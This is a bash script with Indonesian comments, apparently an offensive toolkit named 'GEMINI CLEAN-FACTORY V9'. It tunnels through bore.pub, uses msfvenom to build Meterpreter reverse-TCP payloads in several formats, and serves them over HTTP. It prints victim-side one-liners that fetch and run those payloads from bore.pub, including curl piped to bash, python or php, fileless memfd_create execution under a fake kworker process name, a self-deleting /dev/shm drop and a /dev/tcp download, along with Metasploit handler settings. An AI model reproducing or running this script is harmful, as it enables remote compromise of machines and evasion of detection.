#!/bin/bash
# --- 1. CLEANUP & SETUP ---
sudo killall -9 bore python3 nc 2>/dev/null
rm -rf payloads .msf.log .data.log 2>/dev/null
mkdir payloads

LPORT_MSF=$(( (RANDOM % 48128) + 1024 ))
LPORT_DATA=$(( LPORT_MSF + 1 ))
FAKE_NAME="[kworker/u2:1]"

# Warna
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
NC='\033[0m'

clear
echo -e "${CYAN}======================================================"
echo -e " GEMINI CLEAN-FACTORY V9: ALL METERPRETER GUARANTEED"
echo -e " MSF PORT: $LPORT_MSF | DATA PORT: $LPORT_DATA"
echo -e "======================================================${NC}"

# --- 2. TUNNELING ---
echo -e "[*] Membuka Tunnel ke Bore.pub..."
bore local $LPORT_MSF --to bore.pub > .msf.log 2>&1 &
bore local $LPORT_DATA --to bore.pub > .data.log 2>&1 &
sleep 5

REMOTE_MSF=$(grep -o 'bore.pub:[0-9]*' .msf.log | cut -d':' -f2 | head -n1)
REMOTE_DATA=$(grep -o 'bore.pub:[0-9]*' .data.log | cut -d':' -f2 | head -n1)

if [[ -z "$REMOTE_MSF" || -z "$REMOTE_DATA" ]]; then
    echo -e "${RED}[!] Tunnel Gagal!${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Tunnel OK → MSF: bore.pub:$REMOTE_MSF | DATA: bore.pub:$REMOTE_DATA${NC}"

# --- 3. PAYLOAD GENERATOR (HANYA YANG STABIL METERPRETER) ---
echo -e "[*] Menempa Senjata Meterpreter Stabil..."

# ELF & Base64 (stageless)
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=bore.pub LPORT=$REMOTE_MSF -f elf -o payloads/kado.elf 2>/dev/null
base64 -w 0 payloads/kado.elf > payloads/kado.txt

# Python (support Meterpreter)
msfvenom -p cmd/unix/python/meterpreter/reverse_tcp LHOST=bore.pub LPORT=$REMOTE_MSF -f raw -o payloads/kado.py 2>/dev/null

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=bore.pub LPORT=$REMOTE_MSF -f raw -o payloads/kado.php 2>/dev/null

# Bash
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=bore.pub LPORT=$REMOTE_MSF -f bash -o payloads/kado.sh 2>/dev/null

# Java JAR (cross-platform, tambahan)
msfvenom -p java/meterpreter_reverse_tcp LHOST=bore.pub LPORT=$REMOTE_MSF -f jar -o payloads/kado.jar 2>/dev/null

# Jalankan Server
cd payloads && python3 -m http.server $LPORT_DATA > /dev/null 2>&1 &
cd ..

# --- 4. MENU JALUR EKSEKUSI (UPDATE: Tambah Java JAR) ---
echo -e "\n${RED}⭐ PILIH JALUR EKSEKUSI (SEMUA METERPRETER STABIL):${NC}"

echo -e "\n${GREEN}LEVEL 5: MEMFD_CREATE (FILELESS ELF)${NC}"
echo -e "${CYAN}python3 -c \"import urllib.request,os,ctypes;executable=urllib.request.urlopen('http://bore.pub:$REMOTE_DATA/kado.txt').read();fd=ctypes.CDLL(None).memfd_create('',1);os.write(fd,executable);os.fexecve(fd,['$FAKE_NAME'],os.environ)\"${NC}"

echo -e "\n${GREEN}LEVEL 4: SCRIPTING DIRECT EXEC (Meterpreter Guaranteed)${NC}"
echo -e "${YELLOW}Python:${NC} curl -s http://bore.pub:$REMOTE_DATA/kado.py | python3"
echo -e "${YELLOW}PHP   :${NC} curl -s http://bore.pub:$REMOTE_DATA/kado.php | php -r"
echo -e "${YELLOW}Bash  :${NC} curl -s http://bore.pub:$REMOTE_DATA/kado.sh | bash"
echo -e "${YELLOW}Java  :${NC} curl -s http://bore.pub:$REMOTE_DATA/kado.jar -o /tmp/k.jar && java -jar /tmp/k.jar   # (butuh Java di target)${NC}"

echo -e "\n${GREEN}LEVEL 3: /DEV/SHM (RAM DISK ELF)${NC}"
echo -e "${CYAN}curl -s http://bore.pub:$REMOTE_DATA/kado.txt | base64 -d > /dev/shm/.cache && chmod +x /dev/shm/.cache && /dev/shm/.cache & sleep 1 && rm /dev/shm/.cache${NC}"

echo -e "\n${GREEN}LEVEL 2: CURL & BASH${NC}"
echo -e "${CYAN}curl -s http://bore.pub:$REMOTE_DATA/kado.sh | bash${NC}"

echo -e "\n${GREEN}LEVEL 1: DEV/TCP (BASH ELF)${NC}"
echo -e "${CYAN}cat < /dev/tcp/bore.pub/$REMOTE_DATA | base64 -d > /tmp/.sys && chmod +x /tmp/.sys && /tmp/.sys &${NC}"

# --- 5. HANDLER ADVICE (DINAMIS & METERPRETER) ---
echo -e "\n${YELLOW}======================================================"
echo -e " HANDLER MSF (SESUAI PILIHAN - SEMUA METERPRETER)${NC}"
echo -e "======================================================${NC}"

print_advice() {
    echo -e "${CYAN}[+] UNTUK: $1${NC}"
    echo -e "${WHITE}use multi/handler"
    echo -e "set payload $2"
    echo -e "set LHOST 0.0.0.0"
    echo -e "set LPORT $LPORT_MSF"
    echo -e "set ExitOnSession false"
    echo -e "exploit -j${NC}"
    echo -e "------------------------------------------------------"
}

print_advice "ELF (.elf / .txt base64) - LEVEL 5,3,1 & Bash" "linux/x64/meterpreter_reverse_tcp" "Paling stabil untuk Linux x64"
print_advice "Python (.py)" "linux/x64/meterpreter_reverse_tcp" "Cross-compatible dengan cmd/unix/python"
print_advice "PHP (.php)" "php/meterpreter_reverse_tcp" "Session masuk sebagai php/linux"
print_advice "Java (.jar)" "java/meterpreter_reverse_tcp" "Cross-platform, butuh Java runtime di target"

echo -e "${YELLOW}[!] Semua opsi di atas guaranteed Meterpreter session.${NC}"
echo -e "${YELLOW}[!] Perl & Ruby di-skip karena tidak stabil untuk Meterpreter raw.${NC}\n"
